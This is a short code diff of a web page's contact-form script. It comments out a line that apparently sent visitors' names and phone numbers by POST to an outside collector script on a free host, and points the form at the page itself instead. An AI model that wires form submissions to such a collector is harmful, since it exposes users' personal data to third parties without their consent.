@@ -2474,8 +2474,9 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
           }
           $.ajax({
             //url: "https://tag-trainer.raccoon.ag/site/mail/contact_me.php",
-            url: "http://banheiro.c1.biz/tag/collect.php",
-            type: "POST",
+            //url: "http://banheiro.c1.biz/tag/collect.php",
+            url: window.location,
+            type: "GET",
             data: {
               name: name,
               phone: phone,
